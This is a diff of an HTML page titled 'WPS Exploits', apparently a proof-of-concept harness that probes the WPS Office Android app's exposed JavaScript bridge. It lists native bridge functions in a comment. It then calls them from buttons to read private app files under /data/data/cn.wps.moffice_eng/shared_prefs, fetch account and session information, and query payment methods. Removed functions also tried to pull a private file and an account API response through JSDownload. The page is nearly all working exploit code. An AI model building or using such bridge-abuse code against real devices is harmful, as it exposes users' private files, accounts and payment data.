@@ -12,7 +12,22 @@
 
     <title>WPS Exploits</title>
 </head>
-
+<!-- 
+JSDownload
+JSGetClientInfo
+JSGetPaymentWay
+JSIntentSchemeURI
+JSSupportLaunchDeeplink
+collectData
+collectDataV3
+goToLoginAndCallBackUserInfo
+jsOpenDefinedInterface -> new file , user
+jsOpenFile
+requestSession
+requestSessionUserInfo
+shareWx
+startTask
+ -->
 <body>
     <h1>WPS Exploits!</h1>
     <script type="text/javascript">
@@ -124,27 +139,6 @@
             }
         }
 
-        function tryDownload2() {
-            try {
-                document.getElementById("myP").innerHTML = splash.JSDownload("random", "https://account.wps.com/api/v3/mine#.txt")
-                // document.getElementById("myP").innerHTML += splash.download("https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt","./")
-                // document.getElementById("myP").innerHTML += splash.download("/sdcard","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
-                // document.getElementById("myP").innerHTML += splash.download("./","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
-            }
-        }
-
-        function tryDownload3() {
-            try {
-                document.getElementById("myP").innerHTML = splash.JSDownload("random", "file:///data/data/cn.wps.moffice_eng/shared_prefs/fileradar_record.xml")
-                // document.getElementById("myP").innerHTML += splash.download("https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt","./")
-                // document.getElementById("myP").innerHTML += splash.download("/sdcard","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
-                // document.getElementById("myP").innerHTML += splash.download("./","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
-            } catch (error) {
-                document.getElementById("myP").innerHTML = error;
-            }
-        }
         function loginCallback(){
             splash.goToLoginAndCallBackUserInfo()
             try {
@@ -155,7 +149,15 @@
         }
         function testGetFile() {
             try {
-                document.getElementById("myP").innerHTML = getFileSize("file:///data/data/cn.wps.moffice_eng/shared_prefs/fileradar_record.xml")
+                document.getElementById("myP").innerHTML = splash.getFileSize("file:///data/data/cn.wps.moffice_eng/shared_prefs/fileradar_record.xml")
+            } catch (error) {
+                document.getElementById("myP").innerHTML = error;
+            }
+        }
+
+        function JSGetPaymentWay() {
+            try {
+                document.getElementById("myP").innerHTML = splash.JSGetPaymentWay()
             } catch (error) {
                 document.getElementById("myP").innerHTML = error;
             }
@@ -215,11 +217,6 @@
 
     </button>
     <br>
-    <button onclick="tryDownload2()">
-        Call download2 - Native Function
-
-    </button>
-    <br>
     <button onclick="loginCallback()">
         Call callback login - Native Function
 
@@ -229,6 +226,11 @@
     <button onclick="testGetFile()">
         Call File - Native Function
 
+    </button>
+
+    <br>
+    <button onclick="JSGetPaymentWay()">
+        Call JSGetPaymentWay
     </button>
 
 
